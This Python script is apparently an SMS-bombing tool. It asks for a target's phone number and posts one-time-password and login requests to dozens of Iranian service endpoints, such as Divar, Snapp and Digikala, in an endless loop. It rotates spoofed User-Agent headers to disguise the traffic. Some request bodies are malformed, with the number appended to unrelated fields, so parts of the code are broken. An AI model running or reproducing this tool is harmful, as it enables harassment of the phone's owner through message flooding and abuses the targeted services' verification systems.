import requests
import random
import time
print("\033[32m Script Creator By ♡D_gorjipoor")

number = input("Shomare Hadaf Vared Konid (without 0) : ")

url_divar= "https://api.divar.ir/v5/auth/authenticate"
json_divar= {"phone":number}

url_snapp= "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp"
json_snapp= {"cellphone":"+98" + number}

url_sf= "https://snappfood.ir/mobile/v2/user/loginMobileWithNoPass?lat=35.774&long=51.418&optionalClient=WEBSITE&client=WEBSITE&deviceType=WEBSITE&appVersion=8.1.1&UDID=4a2dcc5a-4b65-4b72-a3ab-c6cdcc6e1737&locale=fa"
json_sf= {"cellphone":"0" + number}

url_basalam= "https://auth.basalam.com/otp-request"
json_basalam= {"mobile":"0" + number}

url_sh= "https://www.sheypoor.com/api/v10.0.0/auth/send"
json_sh= {"username":"0" + number}

url_alibaba= "https://ws.alibaba.ir/api/v3/account/mobile/otp"
json_alibaba= {"phoneNumber":"+98" + number}

url_cinma= "https://cinematicket.org/api/v1/users/signup"
json_cinma= {"phone_number":"98" + number}

url_digikala= "https://api.digikala.com/v1/user/authenticate/"
json_digikala= {"backUrl":"/","username":"0" + number}

url_jet= "https://api.digikalajet.ir/user/login-register/"
json_jet= {"phone":"0" + number}

url_virgool= "https://virgool.io/api/v1.4/auth/verify"
json_virgool= {"method":"phone","identifier":"+98" + number}

url_aparat= "https://www.aparat.com/api/fa/v1/user/Authenticate/signin_step1?callbackType=postmessage"
json_aparat= {"temp_id":"474674","account":"0","codepass_type":"otp","guid":"3433103F-9DE0-6E66-5829-B02DFE66EEF0" + number}

url_telewebion= "https://auth.telewebion.com/user/authenticate"
json_telewebion= {"field":"+98","type":"mobile" + number}

url_sb= "https://cpanel.snapp-box.com/api/v2/auth/otp/send"
json_sb= {"phoneNumber":"0" + number}

url_tpsi= "https://api.tapsi.cab/api/v2/user"
json_tpsi= {"credential":{"phoneNumber":"0","role":"PASSENGER" + number}}

url_8pic= "https://8pic.ir/otp_join.php"
json_8pic= {"phone":"0" + number}

url_mamifood= "https://mamifood.org/Registration.aspx/SendValidationCode"
json_mamifood= {"phone":"0" + number}

url_delino= "https://www.delino.com/user/register"
json_delino= {"mobile":"0" + number}

url_atavich= "https://atawich.com/Account/FoodPhoneNumberVerification/?lazyLoad=true&btnID=undefined"
json_atavich= {"phoneNumber":"0" + number}

url_ghazvinfood= "https://qazvinfood.com/register"
json_ghazvinfood= {"phone":"0" + number}

url_foodcenter= "https://www.foodcenter.ir/account/sabtmobile"
json_foodcenter= {"mobile":"0" + number}

url_beroozmart= "https://api.beroozmart.com/api/pub/account/check-user"
json_beroozmart= {"username":"0" + number}

url_anzalifood= "https://anzalifood.ir/auth/mobile"
json_anzalifood= {"mobile":"0" + number}

url_dayanshop= "https://dayanshop.com/Auth/CheckPhoneNumber"
json_dayanshop= {"phoneNumber":"0" + number}

url_alafood= "https://restaurant.delino.com/user/register"
json_alafood= {"username":"0" + number}

url_zodex= "https://admin.zoodex.ir/api/v1/check-mobile"
json_zodex= {"mobile":"0" + number}

url_shopgarlet= "https://shop.garlet.ir/login"
json_shopgarlet= {"mobile":"0" + number}

url_mahabadfood= "https://api.mahabadfood.ir/api/user/sendApp"
json_mahabadfood= {"phone":"0" + number}

url_sonatiiran= "https://restaurant.delino.com/user/register"
json_sonatiiran= {"username":"0" + number}

url_zoodpazfood= "https://api.zoodpazfood.com/api/user/getCode"
json_zoodpazfood= {"mobile":"0" + number}

url_zeyton= "https://zytoon.ir/user/confrim_mobile"
json_zeyton= {"mobile":"0" + number}

url_nimro= "https://nimrou.ir/birfood/ajax"
json_nimro= {"number":"0" + number}

url_ala= "https://restaurant.delino.com/user/register"
json_ala= {"username":"0" + number}


url_haftkhan= "https://restaurant.delino.com/user/register"
json_haftkhan= {"username":"0" + number}

url_talaryazd= "https://restaurant.delino.com/user/register"
json_talaryazd= {"username":"0" + number}

url_ghazakademaede= "https://restaurant.delino.com/user/register"
json_ghazakademaede= {"username":"0" + number}

url_emaratvakil= "https://restaurant.delino.com/user/register"
json_emaratvakil= {"username":"0" + number}

url_niavaran= "https://restaurant.delino.com/user/register"
json_niavaran= {"username":"0" + number}

url_shirinpolo= "https://restaurant.delino.com/user/register"
json_shirinpolo= {"username":"0" + number}

url_mortazavifood= "https://restaurant.delino.com/user/register"
json_mortazavifood= {"username":"0" + number}

url_fodl= "https://restaurant.delino.com/user/register"
json_fodl= {"username":"0" + number}

url_alinland= "https://www.alinland.com/login/ajax/login"
json_alinland= {"mobile":"0" + number}

url_sadtabad= "https://restaurant.delino.com/user/register"
json_sadtabad= {"username":"0" + number}

url_kimia= "http://foodsoftonline.ir/login/3826/S2C6d44HKm"
json_kimia= {"mob":"0" + number}

url_shiladfood= "https://restaurant.delino.com/user/register"
json_shiladfood= {"username":"0" + number}

url_sokhari= "https://restaurant.delino.com/user/register"
json_sokhari= {"username":"0" + number}







heads = [
    {
    'User-Agent' : 'Mozilla/5.0 (Windows NT 6.1; rv:76.0)Gecko/20100101 Firefox/76.0',
    'Accept': '*/*'
    },
     {
    "User-Agent" : "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0)Gecko/20100101 Firefox/72.0",
    'Accept': '*/*'
    },
     {
    "User-Agent" : "Mozilla/5.0 (X11; Debian; Linux X86_64; rv:72.0)Gecko/20100101 Firefox/72.0",
    'Accept': '*/*'
    },
     {
    'User-Agent' : 'Mozilla/5.0 (Windows NT 6.1; rv:76.0)Gecko/20100101 Firefox/69.0',
    'Accept': '*/*'
    },
     {
    "User-Agent" : "Mozilla/5.0 (X11; Debian; Linux X86_64; rv:72.0)Gecko/20100101 Firefox/76.0",
    'Accept': '*/*'
    },
]


while True:
    random_head = random.choice(heads)
    req = requests.post(url=url_divar,json=json_divar,headers=random_head)
    print(req)

    req1 = requests.post(url= url_snapp,json=json_snapp,headers=random_head)
    print(req1)

    req2 = requests.post(url= url_sf,json=json_sf,headers=random_head)
    print(req2)

    req3 = requests.post(url= url_sh,json=json_sh,headers=random_head)
    print(req3)

    req4 = requests.post(url= url_alibaba,json=json_alibaba,headers=random_head)
    print(req4)

    req5 = requests.post(url= url_cinma,json=json_cinma,headers=random_head)
    print(req5)
    req6 = requests.post(url= url_digikala,json=json_digikala,headers=random_head)
    print(req6)

    req7 = requests.post(url= url_jet,json=json_jet,headers=random_head)
    print(req7)

    req8 = requests.post(url= url_virgool,json=json_virgool,headers=random_head)
    print(req8)

    req9 = requests.post(url= url_aparat,json=json_aparat,headers=random_head)
    print(req9)

    req10 = requests.post(url= url_telewebion,json=json_telewebion,headers=random_head)
    print(req10)

    req11 = requests.post(url= url_sb,json=json_sb,headers=random_head)
    print(req11)

    req12 = requests.post(url= url_tpsi,json=json_tpsi,headers=random_head)
    print(req12)

    time.sleep(1)